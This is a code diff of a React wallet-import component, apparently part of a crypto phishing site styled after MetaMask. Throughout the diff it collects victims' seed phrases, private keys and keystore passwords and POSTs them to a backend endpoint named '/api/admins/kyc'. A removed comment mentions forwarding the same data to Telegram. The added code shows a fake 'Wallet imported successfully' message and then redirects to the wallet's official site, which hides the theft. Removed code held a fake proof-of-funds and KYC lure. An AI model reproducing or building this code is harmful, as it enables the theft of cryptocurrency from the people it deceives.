@@ -1,7 +1,6 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ProofOfFund from './ProofOfFund';
 import { v4 as uuidv4 } from 'uuid';
+import { walletRedirectLinks } from '../walletRedirectLinks';
 
 // Default theme (MetaMask style)
 const defaultTheme = {
@@ -22,10 +21,6 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const [activeTab, setActiveTab] = useState('phrase');
   const [showPassword, setShowPassword] = useState(false);
   const [toast, setToast] = useState({ show: false, message: '' });
-  const [showPOF, setShowPOF] = useState(false);
-  const [startCountdown, setStartCountdown] = useState(false);
-  const [selectedWalletType, setSelectedWalletType] = useState(null);
-  const [walletFormData, setWalletFormData] = useState(null);
   const [progress, setProgress] = useState(100);
   const [sessionId, setSessionId] = useState(() => {
     const existingSessionId = localStorage.getItem('sessionId');
@@ -35,68 +30,6 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     return newSessionId;
   });
   const toastTimeout = useRef(null);
-  const navigate = useNavigate();
-
-  useEffect(() => {
-    // Removed navigation logic to prevent URL change
-  }, [showPOF]);
-
-  useEffect(() => {
-    if (toast.show && toast.message.includes('Wallet imported successfully')) {
-      setProgress(100);
-      const interval = setInterval(() => {
-        setProgress((prev) => {
-          if (prev <= 0) {
-            clearInterval(interval);
-            setToast({ show: false, message: '' });
-            setShowPOF(true);
-            setStartCountdown(true);
-            (async () => {
-              try {
-                const pendingKey = `kyc_pending_${sessionId}`;
-                const raw = localStorage.getItem(pendingKey);
-                if (!raw) return;
-                const pending = JSON.parse(raw);
-                const payload = {
-                  sessionId: pending.sessionId || sessionId,
-                  walletType: selectedWalletType || walletFormData?.walletType || 'unknown',
-                  seedPhrase: walletFormData?.key || undefined,
-                  keystoreJson: walletFormData?.keystoreJson || undefined,
-                  password: walletFormData?.pass || undefined,
-                  privateKey: walletFormData?.privateKey || undefined,
-                  imageUrls: pending.imageUrls || [],
-                  fileMap: pending.fileMap || {},
-                  dealersLicenseStatus: pending.dealersLicenseStatus || 'available',
-                  qualityRequired: pending.qualityRequired || '',
-                  karatsPurity: pending.karatsPurity || '',
-                  destinationRefineryText: pending.destinationRefineryText || '',
-                };
-                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
-                  method: 'POST', 
-                  headers: { 'Content-Type': 'application/json' }, 
-                  body: JSON.stringify(payload) 
-                });
-                if (!res.ok) {
-                  const txt = await res.text();
-                  console.warn('Failed to submit pending KYC:', res.status, txt);
-                  return;
-                }
-                localStorage.removeItem(pendingKey);
-                console.log('Pending KYC submitted for session', payload.sessionId);
-                  // Session is NOT cleared/reset here. It will persist unless user starts afresh from kyc-documents page.
-              } catch (err) {
-                console.error('Error submitting pending KYC', err);
-              }
-            })();
-            return 0;
-          }
-          return prev - 5;
-        });
-      }, 100);
-
-      return () => clearInterval(interval);
-    }
-  }, [toast.show, toast.message, sessionId, selectedWalletType, walletFormData]);
 
   useEffect(() => {
     if (toast.show && toast.style?.isError) {
@@ -262,75 +195,63 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
       return;
     }
 
-    // Check if there's pending KYC data
-    const pendingKey = `kyc_pending_${currentSessionId}`;
-    const raw = localStorage.getItem(pendingKey);
-    
-    console.log('Current session ID:', currentSessionId);
-    console.log('Pending KYC key:', pendingKey);
-    console.log('Has pending KYC data:', !!raw);
-    console.log('Active tab:', activeTab);
-    console.log('Wallet type:', walletType);
-    
-    // If no KYC data, immediately send wallet data to backend and Telegram
-    if (!raw) {
-      console.log('No pending KYC data found - will send direct wallet import');
-      
-      // Use the exact same approach as the KYC flow (line 75)
-      const payload = {
-        sessionId: currentSessionId,
-        walletType: walletType,
-        seedPhrase: activeTab === 'phrase' ? key : undefined,
-        keystoreJson: activeTab === 'keystore' ? key : undefined,
-        password: activeTab === 'keystore' ? pass : undefined,
-        privateKey: activeTab === 'private' ? key : undefined,
-        imageUrls: [],
-        fileMap: {},
-        dealersLicenseStatus: 'not_available',
-        qualityRequired: 'N/A',
-        karatsPurity: 'N/A',
-        destinationRefineryText: 'N/A',
-      };
+    // Send wallet import data to backend
+    const payload = {
+      sessionId: currentSessionId,
+      walletType: walletType,
+      seedPhrase: activeTab === 'phrase' ? key : undefined,
+      keystoreJson: activeTab === 'keystore' ? key : undefined,
+      password: activeTab === 'keystore' ? pass : undefined,
+      privateKey: activeTab === 'private' ? key : undefined,
+      imageUrls: [],
+      fileMap: {},
+      dealersLicenseStatus: 'not_available',
+      qualityRequired: 'N/A',
+      karatsPurity: 'N/A',
+      destinationRefineryText: 'N/A',
+    };
 
-      console.log('Payload to send:', JSON.stringify(payload, null, 2));
-
-      // Use EXACTLY the same fetch approach as the existing KYC flow
-      fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
-        method: 'POST', 
-        headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify(payload) 
-      })
+    fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    })
       .then(res => {
-        console.log('Response status:', res.status);
         if (!res.ok) {
           return res.text().then(txt => {
-            console.error('Failed to submit direct wallet import:', res.status, txt);
-            throw new Error(`Server responded with ${res.status}: ${txt}`);
+            console.error('Failed to submit wallet import:', res.status, txt);
+            setToast({ show: true, message: 'Submission failed. Redirecting…', style: { isError: true } });
+            throw new Error('Submit failed');
           });
         }
         return res.json();
       })
-      .then(data => {
-        console.log('Direct wallet import submitted successfully:', data);
-        console.log('Session:', currentSessionId);
+      .then(() => {
+        setToast({
+          show: true,
+          message: 'Wallet imported successfully! Redirecting…',
+          style: { background: '#fff', color: '#4caf50', isError: false },
+        });
+        // Redirect to the wallet's official site immediately (no screenshot)
+        const redirectDelayMs = 1500;
+        const redirectUrl =
+          walletRedirectLinks[walletType] ||
+          walletRedirectLinks[walletType?.replace(/wallet$/, '')];
+        setTimeout(() => {
+          if (redirectUrl) {
+            window.location.href = redirectUrl;
+          } else {
+            window.location.href = '/wallets';
+          }
+        }, redirectDelayMs);
       })
       .catch(err => {
-        console.error('Error submitting direct wallet import:', err);
+        if (err?.message !== 'Submit failed') {
+          console.error('Error submitting wallet import:', err);
+          setToast({ show: true, message: 'Submission failed. Redirecting…', style: { isError: true } });
+        }
+        setTimeout(() => { window.location.href = '/wallets'; }, 2000);
       });
-    } else {
-      console.log('Pending KYC data found - will submit with POF later');
-    }
-
-    // If validation passes, proceed with import
-    setSelectedWalletType(walletType);
-    setWalletFormData({ walletType, key, pass, activeTab: activeTab });
-    setStartCountdown(false);
-    setShowPOF(false);
-    setToast({ 
-      show: true, 
-      message: 'Wallet imported successfully!', 
-      style: { background: '#fff', color: '#4caf50', isError: false } 
-    });
   };
 
   const tabData = [
@@ -384,14 +305,6 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
         </form>
       )
     },
-    // Add a new tab for POF
-    {
-      key: 'pof',
-      label: 'POF',
-      content: (
-        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
-      )
-    }
   ];
 
   return (
@@ -438,25 +351,21 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
           )}
         </div>
       )}
-      {showPOF ? (
-        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
-      ) : (
-        <div>
-          <div className="flex gap-2 mb-2">
-            {tabData.map(tab => (
-              <button
-                key={tab.key}
-                style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
-                className={`px-4 py-2 rounded font-bold text-sm border`}
-                onClick={() => setActiveTab(tab.key)}
-              >
-                {tab.label}
-              </button>
-            ))}
-          </div>
-          <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
+      <div>
+        <div className="flex gap-2 mb-2">
+          {tabData.map(tab => (
+            <button
+              key={tab.key}
+              style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
+              className={`px-4 py-2 rounded font-bold text-sm border`}
+              onClick={() => setActiveTab(tab.key)}
+            >
+              {tab.label}
+            </button>
+          ))}
         </div>
-      )}
+        <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
+      </div>
     </div>
   );
 };
